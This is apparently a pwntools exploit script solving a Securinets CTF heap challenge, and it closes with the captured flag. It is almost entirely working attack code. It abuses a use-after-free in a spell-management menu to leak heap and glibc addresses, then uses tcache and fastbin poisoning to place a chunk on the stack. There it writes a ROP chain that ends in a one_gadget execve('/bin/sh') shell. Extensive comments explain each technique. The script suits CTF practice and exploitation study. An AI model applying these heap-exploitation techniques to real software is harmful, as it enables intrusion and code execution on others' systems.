from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./main', '''
    continue
''')

# p = remote('pwn-14caf623.p1.securinets.tn', 9091)

# calloc a chunk of size 0x80 at an index and read technically 0x6c bytes of data at most into it
def add_spell(slot, name, effect, cost, colldown, element):
    p.sendlineafter(b"Choice: ", b'1')
    p.sendlineafter(b"Choose spell slot (0-31): ", str(slot).encode()) # chunk index
    p.sendafter(b"Enter spell name: ", name) # chunk data from offset 0x0 to 0x20 (0x20 bytes at most, null terminated)
    p.sendafter(b"Enter spell effect: ", effect) # chunk data from offset 0x20 to 0x60 (0x40 bytes at most, null terminated)
    p.sendlineafter(b"Enter mana cost: ", str(cost).encode()) # chunk data from offset 0x60 to 0x64 (0x4 bytes at most)
    p.sendlineafter(b"Enter cooldown (in seconds): ", str(colldown).encode()) # chunk data from offset 0x64 to 0x68 (0x4 bytes at most)
    p.sendlineafter(b"Choice: ", str(element).encode()) # chunk data from offset 0x68 to 0x6c (0x4 bytes at most)

# edit a chunk's data at an index and read technically 0x6c bytes of data at most into it
def edit_spell(slot, name, effect, cost, colldown, element):
    p.sendlineafter(b"Choice: ", b'2')
    p.sendlineafter(b"Enter spell slot to edit (0-31): ", str(slot).encode()) # chunk index
    p.sendafter(b"Enter new spell name: ", name) # chunk data from offset 0x0 to 0x20 (0x20 bytes at most, null terminated)
    p.sendafter(b"Enter new effect: ", effect) # chunk data from offset 0x20 to 0x60 (0x40 bytes at most, no null terminated)
    p.sendlineafter(b"Enter new mana cost: ", str(cost).encode()) # chunk data from offset 0x60 to 0x64 (0x4 bytes at most)
    p.sendlineafter(b"Enter new cooldown (in seconds): ", str(colldown).encode()) # chunk data from offset 0x64 to 0x68 (0x4 bytes at most)
    p.sendlineafter(b"Choice: ", str(element).encode()) # chunk data from offset 0x68 to 0x6c (0x4 bytes at most)

# write all chunks' data at all indeces (0x20 chunks), each of which is technically 0x6c bytes
def view_spell():
    p.sendlineafter(b"Choice: ", b'3')

# free a chunk at an index, not setting its pointer to NULL (use-after-free vulnerability)
def delete_spell(slot):
    p.sendlineafter(b"Choice: ", b'4')
    p.sendlineafter(b"Enter spell slot to delete (0-31): ", str(slot).encode())

# malloc a chunk with a given size, read corresponding bytes of data at most into it, and write malloced chunk's data as a string by puts function (this can be used twice at most)
def feedback(size, feedback):
    p.sendlineafter(b"Choice: ", b'5')
    p.sendlineafter(b"Enter size of feedback: ", str(size).encode())
    p.sendafter(b"Enter feedback: ", feedback)

# return from main function and exit (there is a 0x8-aligned byte of 0x81 value on stack of main function, which can be used for fastbin dup into stack)
def exit():
    p.sendlineafter(b"Choice: ", b'6')

glibc_e = ELF('./libc.so.6')

# Stage 1: leak heap base address
add_spell(0, b'A', b'\x00', 0, 0, 0)
delete_spell(0)
# leak from first qword of chunk at index 0
view_spell()
p.recvuntil(b"Name: ")
heap_base_addr = u64(p.recv(5).ljust(8, b'\x00'))<<12
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: leak glibc base address through fastbin poisoning into heap
for i in range(1, 15):
    add_spell(i, b'A', b'\x00', 0, 0, 0)
# free 7 chunks to fill tcache bin of size 0x80
for i in range(3, 9):
    delete_spell(i)
# free chunk at heap_base_addr+0x320 into fastbin of size 0x80
delete_spell(1) # heap_base_addr+0x320
# overwrite fd pointer of chunk at heap_base_addr+0x320 to make fastbin of size 0x80 look like heap_base_addr+0x320->heap_base_addr+0x390
edit_spell(1, p64(((heap_base_addr+0x390-0x10)^(heap_base_addr+0x320)>>12)), b'\x00', 0, 0, 0) # heap_base_addr+0x320
# calloc a chunk at heap_base_addr+0x320 to put a 0x8-aligned byte of 0x81 value on heap_base_addr+0x390-0x8 as a valid size field, now fastbin of size 0x80 looks like heap_base_addr+0x390
add_spell(1, b'A', b'\x00', 0, 0, 0x81) # heap_base_addr+0x320
# perform fastbin poisoning into heap at heap_base_addr+0x390 to overwrite size field of chunk at heap_base_addr+0x3a0 to 0x481
add_spell(15, p64(0)+p64(0x481), b'\x00', 0, 0, 0) # heap_base_addr+0x390
# free chunk of fake size 0x480 at heap_base_addr+0x3a0 into unsorted bin, containing chunks from index 2 to 10
delete_spell(2) # heap_base_addr+0x3a0
view_spell() # leak from first qword of chunk at index 2
for _ in range(3):
    p.recvuntil(b"Name: ")
glibc_base_addr = u64(p.recv(6).ljust(8, b'\x00'))-0x203b20
log.info(f"glibc base address: {hex(glibc_base_addr)}")


# Stage 3: leak target stack address through tcache poisoning
# overwrite fd pointer of chunk at heap_base_addr+0x6a0 to make tcache bin of size 0x80 look like heap_base_addr+0x6a0->glibc_base_addr+glibc_e.symbols['__libc_argv']-0x10
edit_spell(8, p64(((glibc_base_addr+glibc_e.symbols['__libc_argv']-0x10)^(heap_base_addr+0x6a0)>>12)), b'\x00', 0, 0, 0) # heap_base_addr+0x6a0
# malloc a chunk to perform tcache poisoning
feedback(0x78, b'A') # heap_base_addr+0x6a0
# malloc a chunk to write 0x10 bytes of data right before glibc_base_addr+glibc_e.symbols['__libc_argv'] for leak by puts function
feedback(0x78, b'A'*0x10) # glibc_base_addr+glibc_e.symbols['__libc_argv']-0x10
p.recvuntil(b"A"*0x10)
target_stack_addr = u64(p.recv(6).ljust(8, b'\x00'))-0x130 # xf -p rw- 0x0000000000000081
log.info(f"target stack address: {hex(target_stack_addr)}")
# target_stack_addr is where a 0x8-aligned byte of 0x81 value is located on stack of main function

# Stage 4: fastbin poisoning into stack for ROP
# free 2 chunks to fill tcache bin of size 0x80
delete_spell(12)
delete_spell(13)
# free chunk at heap_base_addr+0x9a0 into fastbin of size 0x80
delete_spell(14) # heap_base_addr+0x9a0
# overwrite fd pointer of chunk at heap_base_addr+0x9a0 to make fastbin of size 0x80 look like heap_base_addr+0x9a0->target_stack_addr+0x8
edit_spell(14, p64(((target_stack_addr+0x8-0x10)^(heap_base_addr+0x9a0)>>12)), b'\x00', 0, 0, 0) # heap_base_addr+0x9a0
# calloc a chunk at heap_base_addr+0x9a0, now fastbin of size 0x80 looks like target_stack_addr+0x8
add_spell(14, b'A', b'\x00', 0, 0, 0) # heap_base_addr+0x9a0
# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
#   [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
chain = [
    glibc_base_addr+next(glibc_e.search(asm('pop rax; ret'), executable=True)),
    0,
    glibc_base_addr+0xef52b
]
# perform fastbin poisoning into stack at target_stack_addr+0x8 to overwrite saved rbp with a valid value for one gadget and return address with ROP chain
add_spell(16, p64(target_stack_addr+0xa0)+b''.join([p64(c) for c in chain]), b'\x00', 0, 0, 0) # target_stack_addr+0x8
# return from main function to trigger one gadget
exit()

p.interactive()

# Securinets{2b2b12830c88c08096092ec6c07c3e47c543ef893150a4280892f867b67dba39}